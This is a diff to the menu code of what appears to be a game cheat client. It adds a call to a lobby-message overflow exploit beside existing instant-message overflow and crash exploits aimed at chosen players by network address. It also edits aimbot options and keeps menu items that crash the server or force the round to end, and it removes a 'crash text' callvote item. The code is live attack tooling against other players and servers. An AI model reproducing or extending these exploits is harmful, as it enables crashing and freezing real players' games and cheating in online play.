@@ -291,6 +291,7 @@ namespace menu
 								if (freeze)
 								{
 									exploit::instant_message::send_info_response_overflow({ player_xuid });
+									exploit::lobby_msg::send_server_info_overflow(netadr, player_xuid);
 								}
 								
 								exploit::send_crash(netadr, player_xuid);
@@ -400,10 +401,6 @@ namespace menu
 					ImGui::Separator();
 
 					ImGui::Checkbox("Silent mode", &aimbot::silent);
-
-					ImGui::SameLine(width - 100.0f, spacing);
-					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);
-
 					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
 					ImGui::Checkbox("Legit", &aimbot::legit);
 					ImGui::Checkbox("Only bonescan priority targets", &aimbot::priority_bonescan);
@@ -465,6 +462,7 @@ namespace menu
 					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_commands);
 					ImGui::Checkbox("Log instant messages", &events::instant_message::log_messages);
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
+					ImGui::Checkbox("Prevent join requests", &events::instant_message::prevent_join);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
 					{
@@ -502,12 +500,6 @@ namespace menu
 						if (ImGui::MenuItem("Endgame"))
 						{
 							command::execute("mr " + std::to_string(game::cl()->serverId) + " 0 endround");
-						}
-						
-						if (ImGui::MenuItem("Send crash text"))
-						{
-							const auto command = utils::string::va("callvote map \"%s\"", game::CL_AddMessageIcon("postfx_electrified").data());
-							command::execute(command);
 						}
 
 						if (ImGui::MenuItem("Crash server"))
